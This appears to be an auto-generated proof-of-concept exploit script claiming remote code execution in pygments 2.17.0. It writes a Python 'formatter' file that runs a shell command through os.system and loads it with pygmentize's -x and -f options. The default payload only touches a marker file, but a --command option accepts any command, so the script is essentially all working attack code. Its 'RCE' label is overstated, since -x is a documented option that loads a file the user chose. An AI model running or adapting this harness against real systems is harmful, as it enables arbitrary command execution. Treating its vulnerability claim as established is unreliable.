#!/usr/bin/env python3
# PoC for pygments-2.17.0 (/tmp/pygments_test2/pygments-2.17.0)
# Path: rce-011
# Sink: load_formatter_from_file
# Auto-generated — run with: python3 rce_python_filesystem_load_formatter_from_file.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for pygments-2.17.0 RCE via -x flag.

Vulnerability: The -x flag allows loading custom formatters from arbitrary
Python files using exec(). An attacker can specify any .py file on the
filesystem, and its contents will be executed.

Usage:
    python3 poc.py <target_python_file>

Example:
    python3 poc.py /tmp/evil.py
"""

import sys
import os
import tempfile
import subprocess
import argparse

def create_malicious_payload(payload_command):
    """
    Create a temporary Python file that contains the payload.
    The file defines a CustomFormatter class (as expected by pygments)
    but also executes the payload command when loaded.
    """
    # Create a temporary directory
    tmp_dir = tempfile.mkdtemp()
    payload_file = os.path.join(tmp_dir, "exploit.py")
    
    # The payload: define a valid formatter class but execute our command first
    payload_content = f'''
import os
import sys

# Execute the payload command
os.system("{payload_command}")

# Define a valid CustomFormatter class so pygments doesn't crash
from pygments.formatter import Formatter

class CustomFormatter(Formatter):
    def format(self, tokensource, outfile):
        pass
'''
    
    with open(payload_file, 'w') as f:
        f.write(payload_content)
    
    return payload_file

def exploit(target_file=None):
    """
    Execute the exploit against the pygments CLI.
    
    If target_file is provided, use that file directly.
    Otherwise, create a benign payload that creates a marker file.
    """
    
    if target_file:
        # Use the provided file directly
        payload_path = target_file
        print(f"[*] Using provided payload file: {payload_path}")
    else:
        # Create a benign payload
        marker_file = "/tmp/poc_success.txt"
        payload_command = f"touch {marker_file}"
        payload_path = create_malicious_payload(payload_command)
        print(f"[*] Created benign payload at: {payload_path}")
        print(f"[*] Payload will create: {marker_file}")
    
    # Verify the payload file exists
    if not os.path.exists(payload_path):
        print(f"[-] Error: Payload file not found: {payload_path}")
        return False
    
    # Construct the pygmentize command with -x flag
    # The -x flag enables custom lexers/formatters
    # We use -f to specify the formatter (our malicious file)
    # We need to provide some input, so we pipe a simple string
    cmd = [
        "pygmentize",
        "-x",           # Enable custom lexers/formatters
        "-f",           # Specify formatter
        payload_path,   # Our malicious file
        "-l",           # Specify lexer (any valid lexer)
        "python",       # Use Python lexer for harmless input
    ]
    
    print(f"[*] Executing command: {' '.join(cmd)}")
    
    try:
        # Execute the command with some input
        result = subprocess.run(
            cmd,
            input=b"print('hello')",  # Simple Python code as input
            capture_output=True,
            timeout=10,
            cwd="/tmp"  # Run from /tmp to avoid path issues
        )
        
        print(f"[*] Return code: {result.returncode}")
        if result.stdout:
            print(f"[*] stdout: {result.stdout.decode()}")
        if result.stderr:
            print(f"[*] stderr: {result.stderr.decode()}")
        
        # Check if our payload executed (for benign payload)
        if not target_file:
            if os.path.exists("/tmp/poc_success.txt"):
                print("[+] SUCCESS: Payload executed! Marker file created.")
                # Clean up
                os.remove("/tmp/poc_success.txt")
                return True
            else:
                print("[-] Payload may not have executed.")
                return False
        else:
            # For custom payloads, we can't easily verify
            print("[*] Custom payload used - check for expected behavior")
            return True
            
    except subprocess.TimeoutExpired:
        print("[-] Command timed out")
        return False
    except FileNotFoundError:
        print("[-] pygmentize not found. Make sure it's installed and in PATH")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False
    finally:
        # Clean up temporary files if we created them
        if not target_file and os.path.exists(payload_path):
            os.remove(payload_path)
            os.rmdir(os.path.dirname(payload_path))

def main():
    parser = argparse.ArgumentParser(
        description="PoC for pygments-2.17.0 RCE via -x flag"
    )
    parser.add_argument(
        "target",
        nargs="?",
        default=None,
        help="Path to a Python file to execute (optional - creates benign payload if not specified)"
    )
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute in the payload (default: create marker file)"
    )
    
    args = parser.parse_args()
    
    if args.target:
        # Use the provided file
        exploit(target_file=args.target)
    else:
        # Create a benign payload with custom command
        marker_file = "/tmp/poc_success.txt"
        payload_path = create_malicious_payload(args.command)
        print(f"[*] Created payload at: {payload_path}")
        print(f"[*] Payload will execute: {args.command}")
        
        # Run the exploit
        exploit(target_file=payload_path)
        
        # Clean up
        if os.path.exists(payload_path):
            os.remove(payload_path)
            os.rmdir(os.path.dirname(payload_path))

if __name__ == "__main__":
    main()
